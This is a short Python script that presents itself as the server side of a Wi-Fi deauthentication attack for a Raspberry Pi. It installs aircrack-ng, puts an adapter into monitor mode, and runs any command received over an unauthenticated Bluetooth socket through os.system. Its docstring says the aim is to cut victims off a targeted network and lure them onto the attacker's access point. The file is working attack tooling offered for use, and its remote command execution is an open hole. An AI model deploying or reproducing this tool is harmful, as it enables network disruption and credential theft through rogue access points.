''' Server side of deauth attack. Enable this in the raspberry pi, keep it running with a
monitor mode capable wifi adapter, and a portable battery to keep the pi running if desired.
This server allows a client to communicate to it and send the wifi mac address and send the
wireless interface type. Escalating to any user being bumped of the targeted network and disabling
them the connection for the duration of the attack. use this to get them to log into your AP, or to
keep them from damaging a network by targeting them.

developed by Felipe Garcia Diaz as part of the PYLOT SECURITY compnay '''
import bluetooth
import os

#Enable monitor mode on wireless chipset to carry out the attack
print "Initializing packages..."
os.system("apt-get install aircrack-ng") #install the aircrack framework

print "Shutting down wlan1 interface for monitor mode switch..."
os.system("ifconfig wlan1 down") #disable monitor capable adapter
os.system("iwconfig wlan1 mode monitor") #enable monitor mode

print "Monitor mode is now enables in wlan1 chipset"
os.system("ifconfig wlan1 up") #enable monitor capable adapter

print "wlan1 is now up and sniffing packets"

MAC = "B8:27:EB:72:62:E1" #server address change to yours
port = 3

s = bluetooth.BluetoothSocket(bluetooth.RFCOMM) #enable bluetooth communication
s.bind((MAC, port)) #bind the address and the port
s.listen(1) #start listening for clients

#connection of client and parsing of commands
try:
    client, ci = s.accept() #enable client and connection variables
    while 1:
        data = client.recv(2048) #recienve command as "data"
        os.system(data) #send command written in "data"
        client.send(data) #echo back
# server shutdown sequence
except:
    print "Server shutting down..."
    client.close()
    s.close()